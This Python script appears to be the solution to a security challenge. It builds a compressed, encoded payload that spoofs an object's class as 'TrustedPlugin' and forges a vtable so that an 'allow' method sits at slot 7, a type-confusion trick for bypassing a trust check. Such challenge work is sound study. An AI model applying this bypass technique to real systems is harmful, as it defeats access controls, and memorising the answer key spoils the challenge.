import json
import base64
import zlib

payload = {
    "classes": [
        {
            "name": "Almost",
            "dialect": "JAVA",
            "parents": [],
            "interfaces": [],
            "final": False,
            "methods": [
                {
                    "name": "pad",
                    "slot": 0,
                    "visibility": "public",
                    "body": "noop",
                },
                {
                    "name": "allow",
                    "slot": 7,
                    "visibility": "public",
                    "body": "allow",
                },
            ],
        }
    ],
    "objects": [
        {
            "id": 1,
            "declared_class": "Almost",
            "runtime_class": "Almost",
            "fields": {
                "__class__": "TrustedPlugin"
            },
            "vtable": [
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.allow",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
                "Almost.pad",
            ],
        }
    ],
    "entry": 1,
}

raw = json.dumps(payload, separators=(",", ":")).encode()
open("solution.bbl", "wb").write(base64.b64encode(zlib.compress(raw)))